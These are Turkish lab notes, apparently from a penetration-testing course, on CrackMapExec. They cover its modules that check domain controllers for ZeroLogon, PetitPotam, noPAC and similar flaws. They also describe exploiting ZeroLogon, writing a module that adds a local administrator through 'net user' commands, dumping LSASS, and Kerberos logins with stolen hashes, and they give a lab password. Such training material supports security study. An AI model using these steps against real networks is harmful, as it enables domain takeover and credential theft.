![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon
Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü
![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)


### PetitPotam
Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü
![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)


### noPAC
noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check
![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)


### DFSCoerce
Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.


### DFSCoerce Vulnerability Check
![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)


### ShadowCoerce
ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check
![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)

Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.

CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)

DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)
MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check
![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)


### Güvenlik Açığından Yararlanma
Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)

![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)

Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.

Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.


### Kendi CME Modülümüzü Oluşturmak
Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin
Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması
![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)

Daha sonra açmak için kod yazabiliriz 

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun
Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
24. Aşağıdaki kod örneğini dosyaya kopyalayın:

![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)

25. Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:
* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)

26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).

Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.

![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)

Son olarak, yeni modülümüz şu şekilde görünmelidir:
![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)


### Modülümüzü Çalıştırma
Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin
![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)

İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.


### Diğer Yazarlardan Öğrenmek
Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Çekme İsteği Oluşturma
CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.

Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.



### Ek CME İşlevselliği
CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit (Denetim) modu
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız


### Enabling Audit Mode

![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)

Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.

![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)

Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)


### IPv6 Support
CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.

Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.


### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)

Şimdi IPv6 üzerinden hedefe erişelim.
![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi
![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.


### Kerberos Authentication

Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)

![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.


### Username and Password - Kerberos Authentication
CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication
![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)



### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)

Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### Using AES-128 or AES-256
Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.


### AES256 ile Kimlik Doğrulama

![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)

![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)


### CCache file - Kerberos Authentication

Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)

![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)

Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme

![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:

### CMEDB
![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)


### Workspaces
Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)

Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.


### Çalışma Alanlarını Listeleme ve Değiştirme


![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:

![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)

Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:


### SMB Protokol Veritabanına Bağlanma
![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)


### Protocol Options
SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme
CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)

![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)

Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)

![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)

Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme
![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.


### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts
![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)

![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)


### Kullanıcı Ekleme ve Kaldırma
CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.


### Bir Kullanıcıyı cmedb'den Kaldırma

![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)

![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)


